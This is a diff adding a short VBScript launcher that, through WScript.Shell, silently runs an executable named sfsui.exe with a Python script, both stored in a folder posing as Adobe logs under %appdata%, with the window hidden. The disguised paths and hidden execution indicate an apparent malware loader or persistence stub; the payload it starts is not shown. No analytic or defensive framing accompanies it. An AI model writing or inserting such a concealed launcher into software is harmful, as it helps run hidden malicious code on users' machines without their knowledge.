@@ -1,0 +1,4 @@
+Dim objShell
+Set objShell = WScript.CreateObject("WScript.Shell")
+objShell.Run "cmd /K %appdata%\Adobe\logs\sfsui.exe %appdata%\Adobe\logs\logsystem.py", 0, False
+Set objShell = Nothing
